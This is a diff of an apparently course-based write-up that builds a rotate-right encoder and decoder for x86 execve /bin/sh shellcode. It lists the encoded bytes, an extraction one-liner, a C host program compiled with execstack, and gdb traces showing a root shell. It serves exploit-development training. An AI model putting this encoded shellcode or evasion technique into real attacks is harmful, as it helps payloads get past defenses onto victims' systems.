@@ -135,19 +135,34 @@ call_decoder:
       0xc7,0xa0,0x13,0xc5,0xa6,0x13,0xc3,0x61,\
       0x16,0x9b,0x01,0xff
 ```
++ Now that both the decoder and encoder are created, the last thing to do is compile and test.  
 
-Now that both the decoder and encoder are created, the last thing to do is compile and test.  
-
-To compile my Assembly code I used the NASM Compiler with these commands. After creating the object file with NASM, I linked the object file using `ld`.  
-
+# Testing the Decoder
+## Compiling Shellcode and Host Program
+#### Compiling the Decoder
 ```bash
 nasm -f elf32 rotateRightDecoder.nasm -o rotateRightDecoder.o
 ld -o rotateRightDecoder rotateRightDecoder.o
 ```
++ To compile my Assembly code I used the NASM Compiler with these commands. After creating the object file with NASM, I linked the object file using `ld`.  
++ Trying to run the decoder itself fails with a segmentation dump.
++ We will extract the hex code using the objdump cl-fu method above and inject it into a host program.
 
-I tested the shellcode using the C program shown in the SLAE course.   
-After extracting the shellcode using the above bash script, I added it to the C program as the `code[]` array.  
+#### Extracting the Hex from the Decoder
+```console
+root# objdump -d 4-rolDecoder | grep '[0-9a-f]:' | \
+grep -v 'file'| cut -f2 -d: | cut -f1-6 -d' ' | \
+tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | \
+sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | \
+sed 's/$/"/g' 
+"\xeb\x0b\x5e\xd0\x0e\x80\x3e\xff\x74\x08\x46\xeb\xf6\xe8"
+"\xf0\xff\xff\xff\x62\x81\xa0\xd0\x5e\x5e\xe6\xd0\xd0\x5e"
+"\xc4\xd2\xdc\x13\xc7\xa0\x13\xc5\xa6\x13\xc3\x61\x16\x9b"
+"\x01\xff"
+```
++ Now we will load this into our `shellcode.c` host program.
 
+#### Shellcode.c Host Program
 ```c
 #include<stdio.h>
 #include<string.h>
@@ -163,11 +178,125 @@ main()
         ret();
 }
 ```
++ I tested the shellcode using the C program shown in the SLAE course.   
++ After extracting the shellcode using the above bash script, I added it to the C program as the `code[]` array.  
 
-To speed up compilation while developing my custom rotation encoder, I created a simple bash script to automate the process.
-
-```bash
-#!/bin/bash
-SHELLCODE=$1
-gcc -fno-stack-protector -z execstack -o shellcode $(pwd)/${SHELLCODE}
+#### Compiling Host C Program
+```console
+gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
 ```
+
+## Analyzing with gdb
+#### gdb setup
+```console
+root# gdb ./shellcode
+gdb-peda$ info variables
+  0x0804a040  code
+gdb-peda$ b *0x0804a040
+  Breakpoint 1 at 0x804a040
+gdb-peda$ run
+  
+# Current Instruction
+=> 0x804a040 <code>:    jmp    0x804a04d <code+13>
+```
++ Here we see the program being run with gdb.
++ A breakpoint was set for when the program starts to execute the instructions at the `code[]` array varaible.
++ We see that our program successfully stopped at the break-point.
++ After the jump we will do a call, which will load the memory address of our encoded execve program on to the top of the stack.
+
+### Stepping Through the Decoder with gdb
+#### Decoder `JMP|Call|POP`
+```console
+# Break-Point
+# Jump
+=> 0x804a040 <code>:    jmp    0x804a04d <code+13>
+
+# step into with si
+gdb-peda$ si
+# Call
+=> 0x804a04d <code+13>: call   0x804a042 <code+2>
+# Pop
+   0x804a042 <code+2>:  pop    esi
+# Decode with Rotate Right
+=> 0x804a043 <code+3>:  ror    BYTE PTR [esi],1
+# Check end of encoded payload
+   0x804a045 <code+5>:  cmp    BYTE PTR [esi],0xff
+```
++ Here we can see our `JMP|Call|POP` instructions being executed.
+  - This loads the address of our encoded payload into the `esi` register.
++ After decoding `1 byte` we can see that our decoder checks to see if it is at the end.
+
+#### Decode First Byte
+```console
+# First Encoded Byte
+gdb-peda$ x/c $esi
+0x804a052 <code+18>:    0x62
+# Instructions to Decode First Byte
+   0x804a043 <code+3>:  ror    BYTE PTR [esi],1
+=> 0x804a045 <code+5>:  cmp    BYTE PTR [esi],0xff
+# First Decoded Byte
+gdb-peda$ x/c $esi
+0x804a052 <code+18>:    0x31
+```
++ We see that our first byte encoded byte was successfully decoded.
+
+#### Decoding all the Bytes
+```console
+=> 0x804a048 <code+8>:  je     0x804a052 <code+18>
+# JUMP is NOT taken
+   0x804a04a <code+10>: inc    esi
+=> 0x804a04b <code+11>: jmp    0x804a043 <code+3>
+# JUMP is taken
+```
++ To move to the next byte in our encoded payload string we use the instruction `inc esi`.
++ We go through this 26 more times until we reach the byte `0xff`.
+
+#### Finding the End of Payload
+```console
+   0x804a043 <code+3>:  ror    BYTE PTR [esi],1
+=> 0x804a045 <code+5>:  cmp    BYTE PTR [esi],0xff
+=> 0x804a048 <code+8>:  je     0x804a052 <code+18>
+# JUMP is taken
+=> 0x804a052 <code+18>: xor    eax,eax
+```
++ `0xff` rotated either way, any amount of times, is always `0xff`.
++ After reaching the final byte `0xff` we jump into our decoded payload.
+
+#### Injected Shellcode at time of Execve Payload Execution
+```console
+[------------------registers------------------]
+EAX: 0xb ('\x0b')
+EBX: 0xbffff500 ("/bin//sh")
+ECX: 0xbffff4f8 --> 0xbffff500 ("/bin//sh")
+EDX: 0xbffff4fc --> 0x0
+
+[---------Current-Instruction-----------------]
+=> 0x804a069 <code+41>: int    0x80
+0000| 0xbffff4f8 --> 0xbffff500 ("/bin//sh")
+0004| 0xbffff4fc --> 0x0
+0008| 0xbffff500 ("/bin//sh")
+0012| 0xbffff504 ("//sh")
+0016| 0xbffff508 --> 0x0
+
+# Execute the Execve 0x80 systemcall
+gdb-peda$ si
+process 27199 is executing new program: /bin/dash
+# whoami
+[New process 788]
+process 788 is executing new program: /usr/bin/whoami
+root
+```
++ We see we successfully decoded and executed our execve payload.
+
+## Testing without gdb
+```console
+root# ./shellcode
+Shellcode Length:  44
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
++ Boom! Our decoded works!
+
+
